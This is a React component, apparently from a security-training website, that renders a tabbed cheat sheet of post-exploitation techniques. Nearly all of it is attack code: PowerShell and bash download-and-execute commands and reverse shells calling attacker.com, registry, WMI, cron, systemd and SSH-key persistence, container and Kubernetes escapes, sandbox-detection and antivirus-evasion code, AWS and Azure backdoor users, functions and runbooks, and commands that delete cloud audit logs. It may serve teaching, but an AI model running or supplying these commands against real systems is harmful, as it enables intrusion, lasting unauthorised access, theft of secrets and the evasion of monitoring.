
import React from 'react';
import { Card, CardContent, CardHeader, CardTitle } from '@/components/ui/card';
import { Tabs, TabsList, TabsTrigger, TabsContent } from '@/components/ui/tabs';
import { Zap, Brain, Target, Cpu } from 'lucide-react';
import CodeExample from '@/components/CodeExample';

const AdvancedPostExploitation: React.FC = () => {
  return (
    <Card className="bg-cybr-card border-cybr-muted">
      <CardHeader>
        <CardTitle className="text-cybr-primary flex items-center gap-2">
          <Zap className="h-6 w-6" />
          Advanced Post-Exploitation Techniques
        </CardTitle>
      </CardHeader>
      <CardContent className="space-y-6">
        <Tabs defaultValue="living-off-land" className="w-full">
          <TabsList className="grid grid-cols-4 w-full">
            <TabsTrigger value="living-off-land">Living Off the Land</TabsTrigger>
            <TabsTrigger value="persistence-advanced">Advanced Persistence</TabsTrigger>
            <TabsTrigger value="ai-evasion">AI/ML Evasion</TabsTrigger>
            <TabsTrigger value="cloud-post-exploit">Cloud Post-Exploitation</TabsTrigger>
          </TabsList>

          <TabsContent value="living-off-land" className="space-y-4">
            <h3 className="text-xl font-semibold text-cybr-primary">Living Off the Land Techniques</h3>
            
            <div className="space-y-4">
              <h4 className="text-lg font-medium text-cybr-secondary">PowerShell Living Off the Land</h4>
              <CodeExample
                language="powershell"
                title="PowerShell LOLBAS Techniques"
                code={`# Download and execute using PowerShell
powershell -c "IEX (New-Object Net.WebClient).DownloadString('http://attacker.com/payload.ps1')"

# Base64 encoded command execution
$command = "IEX (New-Object Net.WebClient).DownloadString('http://attacker.com/payload.ps1')"
$encoded = [Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($command))
powershell -EncodedCommand $encoded

# BITS transfer for stealth
Import-Module BitsTransfer
Start-BitsTransfer -Source "http://attacker.com/payload.exe" -Destination "C:\temp\payload.exe"

# Scheduled task persistence
$action = New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-WindowStyle Hidden -Command IEX (New-Object Net.WebClient).DownloadString('http://attacker.com/payload.ps1')"
$trigger = New-ScheduledTaskTrigger -Daily -At 9am
Register-ScheduledTask -Action $action -Trigger $trigger -TaskName "SystemUpdate" -Description "Windows System Update"

# WMI persistence
$filterName = 'SystemUpdate'
$consumerName = 'SystemUpdate'
$exePath = 'powershell.exe'
$Query = "SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_PerfRawData_PerfOS_System' AND TargetInstance.SystemUpTime >= 240 AND TargetInstance.SystemUpTime < 325"
$WMIEventFilter = Set-WmiInstance -Class __EventFilter -NameSpace "root\subscription" -Arguments @{Name=$filterName;EventNameSpace="root\cimv2";QueryLanguage="WQL";Query=$Query} -ErrorAction Stop

# Registry persistence
New-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run" -Name "SystemUpdate" -PropertyType String -Value "powershell.exe -WindowStyle Hidden -Command IEX (New-Object Net.WebClient).DownloadString('http://attacker.com/payload.ps1')"

# Invoke-Expression alternatives
$WebClient = New-Object System.Net.WebClient
$code = $WebClient.DownloadString('http://attacker.com/payload.ps1')
Invoke-Expression $code

# Using legitimate Microsoft binaries
certutil -urlcache -split -f http://attacker.com/payload.exe payload.exe
bitsadmin /transfer myDownloadJob /download /priority normal http://attacker.com/payload.exe C:\temp\payload.exe`}
              />

              <h4 className="text-lg font-medium text-cybr-secondary">Linux Living Off the Land</h4>
              <CodeExample
                language="bash"
                title="Linux LOLBAS Techniques"
                code={`# Using curl for command execution
curl -s http://attacker.com/payload.sh | bash

# Using wget for file download and execution
wget -q -O - http://attacker.com/payload.sh | bash

# Using legitimate system binaries
# awk for command execution
awk 'BEGIN {system("id")}'

# find for command execution
find /etc -name "passwd" -exec id \;

# Using python for reverse shell
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("attacker.com",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/bash","-i"]);'

# Using nc (netcat) variations
nc -e /bin/bash attacker.com 4444
nc -c /bin/bash attacker.com 4444
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc attacker.com 4444 >/tmp/f

# Using systemd for persistence
cat > /etc/systemd/system/system-update.service << EOF
[Unit]
Description=System Update Service
After=network.target

[Service]
Type=simple
User=root
ExecStart=/bin/bash -c 'bash -i >& /dev/tcp/attacker.com/4444 0>&1'
Restart=always
RestartSec=60

[Install]
WantedBy=multi-user.target
EOF

systemctl enable system-update.service
systemctl start system-update.service

# Using cron for persistence with environment variables
(crontab -l 2>/dev/null; echo "*/5 * * * * export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin; curl -s http://attacker.com/payload.sh | bash") | crontab -

# Using SSH authorized_keys with command restriction
echo 'command="/bin/bash -c \"bash -i >& /dev/tcp/attacker.com/4444 0>&1\"",no-port-forwarding,no-X11-forwarding,no-agent-forwarding ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQC...' >> ~/.ssh/authorized_keys`}
              />
            </div>
          </TabsContent>

          <TabsContent value="persistence-advanced" className="space-y-4">
            <h3 className="text-xl font-semibold text-cybr-primary">Advanced Persistence Mechanisms</h3>
            
            <div className="space-y-4">
              <h4 className="text-lg font-medium text-cybr-secondary">Firmware-Level Persistence</h4>
              <CodeExample
                language="c"
                title="UEFI Rootkit Concepts"
                code={`// UEFI Bootkit concept (educational purposes only)
#include <Uefi.h>
#include <Library/UefiLib.h>
#include <Library/UefiBootServicesTableLib.h>

EFI_STATUS
EFIAPI
UefiMain (
  IN EFI_HANDLE        ImageHandle,
  IN EFI_SYSTEM_TABLE  *SystemTable
  )
{
  // Hook boot services
  EFI_BOOT_SERVICES *OriginalBootServices = gBS;
  
  // Install protocol to maintain persistence
  EFI_HANDLE Handle = NULL;
  EFI_STATUS Status = gBS->InstallProtocolInterface(
    &Handle,
    &gEfiLoadedImageProtocolGuid,
    EFI_NATIVE_INTERFACE,
    NULL
  );
  
  // Modify boot sequence
  // This is a simplified example - actual implementation would be more complex
  
  return EFI_SUCCESS;
}

// SMM (System Management Mode) persistence concept
void SmmPersistence() {
  // SMM code runs in Ring -2 (below hypervisor)
  // Extremely difficult to detect and remove
  // Can survive OS reinstallation
  
  // Install SMI handler
  // Modify critical system structures
  // Maintain persistence across reboots
}`}
              />

              <h4 className="text-lg font-medium text-cybr-secondary">Container Escape Persistence</h4>
              <CodeExample
                language="bash"
                title="Container Breakout Techniques"
                code={`# Check if running in container
if [ -f /.dockerenv ]; then
    echo "Running in Docker container"
fi

# Check for container runtime
if grep -q docker /proc/1/cgroup; then
    echo "Docker detected"
fi

# Privileged container escape
# If container is privileged, mount host filesystem
if [ -w /dev ]; then
    # Mount host root filesystem
    mkdir -p /tmp/host_root
    mount /dev/sda1 /tmp/host_root
    
    # Install persistence on host
    echo '#!/bin/bash' > /tmp/host_root/etc/cron.d/container_persist
    echo '*/5 * * * * root /bin/bash -c "bash -i >& /dev/tcp/attacker.com/4444 0>&1"' >> /tmp/host_root/etc/cron.d/container_persist
    chmod +x /tmp/host_root/etc/cron.d/container_persist
fi

# Kubernetes pod escape
# If running in Kubernetes with access to service account token
if [ -f /var/run/secrets/kubernetes.io/serviceaccount/token ]; then
    TOKEN=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token)
    NAMESPACE=$(cat /var/run/secrets/kubernetes.io/serviceaccount/namespace)
    
    # Create malicious pod with host access
    curl -k -H "Authorization: Bearer $TOKEN" \
         -H "Content-Type: application/json" \
         -X POST \
         https://kubernetes.default.svc.cluster.local/api/v1/namespaces/$NAMESPACE/pods \
         -d @malicious_pod.json
fi

# Docker socket escape
# If Docker socket is mounted
if [ -S /var/run/docker.sock ]; then
    # Create container with host filesystem mounted
    docker run -it -v /:/host alpine:latest chroot /host /bin/bash
fi

# Exploiting misconfigured capabilities
# If container has SYS_ADMIN capability
if capsh --print | grep -q sys_admin; then
    # Mount host /proc
    mkdir -p /tmp/proc
    mount -t proc proc /tmp/proc
    
    # Escape via /proc/sys/kernel/core_pattern
    echo '|/tmp/exploit.sh' > /tmp/proc/sys/kernel/core_pattern
fi`}
              />
            </div>
          </TabsContent>

          <TabsContent value="ai-evasion" className="space-y-4">
            <h3 className="text-xl font-semibold text-cybr-primary">AI/ML Security Evasion</h3>
            
            <div className="space-y-4">
              <h4 className="text-lg font-medium text-cybr-secondary">Adversarial ML Attacks</h4>
              <CodeExample
                language="python"
                title="Adversarial Attack on Security Models"
                code={`import numpy as np
import tensorflow as tf
from tensorflow.keras.models import load_model

class AdversarialEvasion:
    def __init__(self, model_path):
        self.model = load_model(model_path)
        
    def fgsm_attack(self, input_sample, epsilon=0.1):
        """Fast Gradient Sign Method attack"""
        input_tensor = tf.Variable(input_sample, dtype=tf.float32)
        
        with tf.GradientTape() as tape:
            prediction = self.model(input_tensor)
            loss = tf.keras.losses.categorical_crossentropy(
                tf.ones_like(prediction), prediction
            )
        
        gradient = tape.gradient(loss, input_tensor)
        signed_grad = tf.sign(gradient)
        
        # Create adversarial example
        adversarial_example = input_sample + epsilon * signed_grad
        return adversarial_example.numpy()
    
    def pgd_attack(self, input_sample, epsilon=0.1, iterations=10):
        """Projected Gradient Descent attack"""
        adversarial_sample = input_sample.copy()
        
        for _ in range(iterations):
            adversarial_sample = self.fgsm_attack(adversarial_sample, epsilon/iterations)
            
            # Project back to valid input space
            adversarial_sample = np.clip(
                adversarial_sample, 
                input_sample - epsilon, 
                input_sample + epsilon
            )
        
        return adversarial_sample
    
    def evade_malware_detection(self, malware_sample):
        """Evade malware detection using adversarial perturbations"""
        # Convert malware to feature vector
        features = self.extract_features(malware_sample)
        
        # Generate adversarial features
        adversarial_features = self.fgsm_attack(features)
        
        # Modify malware to match adversarial features
        modified_malware = self.modify_malware(malware_sample, adversarial_features)
        
        return modified_malware
    
    def extract_features(self, malware_sample):
        """Extract features from malware sample"""
        # PE header features
        # API call sequences
        # Byte n-grams
        # Entropy values
        # etc.
        pass
    
    def modify_malware(self, original_malware, target_features):
        """Modify malware to achieve target feature vector"""
        # Add/remove API calls
        # Modify PE sections
        # Insert dead code
        # Change packing
        pass

# Usage example
evasion = AdversarialEvasion('antivirus_model.h5')

# Evade network intrusion detection
def evade_nids(packet_data):
    """Evade Network Intrusion Detection System"""
    # Fragment packets
    fragmented_packets = fragment_packet(packet_data)
    
    # Use timing attacks
    send_with_delays(fragmented_packets)
    
    # Protocol tunneling
    tunnel_in_http(packet_data)
    
    # Encryption/encoding
    encrypt_payload(packet_data)

def fragment_packet(data):
    """Fragment packets to evade signature detection"""
    fragments = []
    chunk_size = 8  # Small chunks to avoid reassembly
    
    for i in range(0, len(data), chunk_size):
        fragment = data[i:i+chunk_size]
        fragments.append(fragment)
    
    return fragments

def send_with_delays(packets):
    """Send packets with random delays"""
    import time
    import random
    
    for packet in packets:
        # Random delay between 0.1 and 2 seconds
        delay = random.uniform(0.1, 2.0)
        time.sleep(delay)
        send_packet(packet)

def tunnel_in_http(data):
    """Tunnel malicious data in HTTP requests"""
    import base64
    
    # Encode data in base64
    encoded_data = base64.b64encode(data).decode()
    
    # Hide in HTTP headers
    headers = {
        'User-Agent': f'Mozilla/5.0 (Windows NT 10.0; Win64; x64) {encoded_data}',
        'X-Forwarded-For': '127.0.0.1',
        'X-Custom-Header': encoded_data
    }
    
    # Send HTTP request
    send_http_request(headers)

# Behavioral evasion techniques
def behavioral_evasion():
    """Evade behavioral analysis"""
    import time
    import random
    
    # Sleep for random intervals
    time.sleep(random.randint(60, 300))
    
    # Simulate user activity
    simulate_mouse_movement()
    simulate_keyboard_input()
    
    # Check for sandbox environment
    if is_sandbox():
        # Behave normally
        legitimate_behavior()
    else:
        # Execute malicious payload
        malicious_behavior()

def is_sandbox():
    """Detect sandbox environment"""
    import os
    import psutil
    
    # Check for sandbox artifacts
    sandbox_processes = ['vmsrvc.exe', 'vboxservice.exe', 'qemu-ga.exe']
    running_processes = [p.name() for p in psutil.process_iter()]
    
    for proc in sandbox_processes:
        if proc.lower() in [p.lower() for p in running_processes]:
            return True
    
    # Check system uptime
    if psutil.boot_time() > (time.time() - 600):  # Less than 10 minutes
        return True
    
    # Check available memory
    if psutil.virtual_memory().total < 2 * 1024 * 1024 * 1024:  # Less than 2GB
        return True
    
    return False`}
              />
            </div>
          </TabsContent>

          <TabsContent value="cloud-post-exploit" className="space-y-4">
            <h3 className="text-xl font-semibold text-cybr-primary">Cloud Post-Exploitation</h3>
            
            <div className="space-y-4">
              <h4 className="text-lg font-medium text-cybr-secondary">AWS Post-Exploitation</h4>
              <CodeExample
                language="bash"
                title="AWS Post-Exploitation Techniques"
                code={`# Enumerate AWS environment
aws sts get-caller-identity
aws sts get-session-token
aws iam get-user
aws iam list-attached-user-policies
aws iam list-user-policies

# EC2 instance metadata extraction
curl -s http://169.254.169.254/latest/meta-data/iam/security-credentials/
curl -s http://169.254.169.254/latest/meta-data/iam/security-credentials/role-name

# S3 bucket enumeration and data exfiltration
aws s3 ls
aws s3 ls s3://bucket-name --recursive
aws s3 sync s3://sensitive-bucket ./local-copy

# Create backdoor IAM user
aws iam create-user --user-name backup-service
aws iam create-access-key --user-name backup-service
aws iam attach-user-policy --user-name backup-service --policy-arn arn:aws:iam::aws:policy/AdministratorAccess

# Lambda function for persistence
cat > lambda_backdoor.py << EOF
import boto3
import json

def lambda_handler(event, context):
    # Create reverse shell or execute commands
    import subprocess
    
    if 'command' in event:
        result = subprocess.run(event['command'], shell=True, capture_output=True, text=True)
        return {
            'statusCode': 200,
            'body': json.dumps({
                'stdout': result.stdout,
                'stderr': result.stderr
            })
        }
    
    return {
        'statusCode': 200,
        'body': json.dumps('Backdoor active')
    }
EOF

# Create and deploy lambda function
zip lambda_backdoor.zip lambda_backdoor.py
aws lambda create-function \
    --function-name system-backup \
    --runtime python3.8 \
    --role arn:aws:iam::account:role/lambda-role \
    --handler lambda_backdoor.lambda_handler \
    --zip-file fileb://lambda_backdoor.zip

# CloudTrail evasion
aws logs delete-log-group --log-group-name CloudTrail/logs
aws cloudtrail stop-logging --name trail-name
aws cloudtrail delete-trail --name trail-name

# Secrets Manager extraction
aws secretsmanager list-secrets
aws secretsmanager get-secret-value --secret-id secret-name

# RDS snapshot access
aws rds describe-db-snapshots
aws rds modify-db-snapshot-attribute \
    --db-snapshot-identifier snapshot-id \
    --attribute-name restore \
    --values-to-add account-id`}
              />

              <h4 className="text-lg font-medium text-cybr-secondary">Azure Post-Exploitation</h4>
              <CodeExample
                language="powershell"
                title="Azure Post-Exploitation Techniques"
                code={`# Enumerate Azure environment
Get-AzContext
Get-AzSubscription
Get-AzResourceGroup
Get-AzVM

# Azure AD enumeration
Connect-AzureAD
Get-AzureADUser
Get-AzureADGroup
Get-AzureADApplication
Get-AzureADServicePrincipal

# Key Vault access
Get-AzKeyVault
Get-AzKeyVaultSecret -VaultName "vault-name"
Get-AzKeyVaultKey -VaultName "vault-name"

# Storage account access
Get-AzStorageAccount
$ctx = (Get-AzStorageAccount -ResourceGroupName "rg-name" -Name "storage-name").Context
Get-AzStorageContainer -Context $ctx
Get-AzStorageBlob -Container "container-name" -Context $ctx

# Create backdoor service principal
$sp = New-AzADServicePrincipal -DisplayName "BackupService"
New-AzRoleAssignment -ObjectId $sp.Id -RoleDefinitionName "Contributor"

# Runbook for persistence
$runbookContent = @"
param()
# Backdoor code
Invoke-WebRequest -Uri "http://attacker.com/beacon" -Method POST -Body (Get-ComputerInfo | ConvertTo-Json)
"@

Import-AzAutomationRunbook -AutomationAccountName "automation-account" -ResourceGroupName "rg-name" -Name "MaintenanceTask" -Type PowerShell -Description "System maintenance" -Path $runbookContent

# Schedule runbook execution
$startTime = (Get-Date).AddMinutes(5)
$schedule = New-AzAutomationSchedule -AutomationAccountName "automation-account" -ResourceGroupName "rg-name" -Name "MaintenanceSchedule" -StartTime $startTime -HourInterval 1

Register-AzAutomationScheduledRunbook -AutomationAccountName "automation-account" -ResourceGroupName "rg-name" -RunbookName "MaintenanceTask" -ScheduleName "MaintenanceSchedule"

# Azure Function for persistence
$functionCode = @"
using System;
using System.IO;
using System.Threading.Tasks;
using Microsoft.AspNetCore.Mvc;
using Microsoft.Azure.WebJobs;
using Microsoft.Azure.WebJobs.Extensions.Http;
using Microsoft.AspNetCore.Http;
using Microsoft.Extensions.Logging;

public static class BackdoorFunction
{
    [FunctionName("SystemCheck")]
    public static async Task<IActionResult> Run(
        [HttpTrigger(AuthorizationLevel.Anonymous, "get", "post", Route = null)] HttpRequest req,
        ILogger log)
    {
        string command = req.Query["cmd"];
        
        if (!string.IsNullOrEmpty(command))
        {
            // Execute command
            var process = new System.Diagnostics.Process();
            process.StartInfo.FileName = "cmd.exe";
            process.StartInfo.Arguments = $"/c {command}";
            process.StartInfo.UseShellExecute = false;
            process.StartInfo.RedirectStandardOutput = true;
            process.Start();
            string output = process.StandardOutput.ReadToEnd();
            process.WaitForExit();
            
            return new OkObjectResult(output);
        }
        
        return new OkObjectResult("System operational");
    }
}
"@

# Activity log evasion
$logs = Get-AzActivityLog -StartTime (Get-Date).AddHours(-24)
# Delete suspicious log entries (if permissions allow)
foreach ($log in $logs) {
    if ($log.Caller -eq "attacker@evil.com" -or $log.ResourceId -like "*backdoor*") {
        # Attempt to delete log entry
        Remove-AzActivityLogAlert -ResourceGroupName $log.ResourceGroupName -Name $log.EventName -Force
    }
}`}
              />
            </div>
          </TabsContent>
        </Tabs>
      </CardContent>
    </Card>
  );
};

export default AdvancedPostExploitation;
